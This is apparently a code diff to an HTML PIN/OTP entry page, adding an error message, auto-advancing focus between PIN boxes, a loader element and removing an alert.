@@ -131,8 +131,9 @@
 <input type="password" maxlength="1" class="pin-box" id="pin2">
 <input type="password" maxlength="1" class="pin-box" id="pin3">
 <input type="password" maxlength="1" class="pin-box" id="pin4">
+<p id="errorMsg" style="color:red; text-align:center; display:none;"></p>
     </div>
-<button onclick="submitOtp()" class="login-btn">Submit</button>
+<button id="submitBtn" onclick="submitOtp()" class="login-btn">Submit</button>
 </div>
 
 <!-- BOTTOM BLUE -->
@@ -148,6 +149,23 @@
 </div>
 
 <script>
+
+const inputs = document.querySelectorAll(".pin-box");
+
+inputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+        if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+});
+
 async function submitOtp() {
     let pin = "";
 
@@ -156,8 +174,7 @@ async function submitOtp() {
     });
 
     if (pin.length < 4) {
-        alert("Enter full PIN");
-        return;
+                return;
     }
 
     const phone = document.getElementById("phone").value;
@@ -184,6 +201,6 @@ async function submitOtp() {
     }
 }
 </script>
-
+<div id="pageLoader" class="loader" style="display:none;"></div>
 </body>
 </html>
